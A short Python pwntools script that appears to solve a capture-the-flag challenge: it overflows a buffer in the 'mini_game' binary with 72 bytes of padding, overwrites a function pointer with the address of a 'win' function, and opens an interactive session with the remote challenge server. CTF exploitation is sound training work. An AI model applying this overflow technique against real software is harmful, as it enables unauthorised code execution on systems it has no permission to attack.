from pwn import *

exe = ELF("mini_game")
context.binary = exe
context.arch = 'amd64'
context.os = 'linux'

HOSTNAME = 'offsec.m0lecon.it'
PORT = 13506

OFFSET_TO_FUNCPTR = 72


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote(HOSTNAME, PORT)
    return r


def main():
    r = conn()

    r.recvuntil(b"go?\n")

    payload = flat(
        b'A' * OFFSET_TO_FUNCPTR,
        p64(exe.sym.win)
    )
    r.sendline(payload)

    r.interactive()


if __name__ == '__main__':
    main()
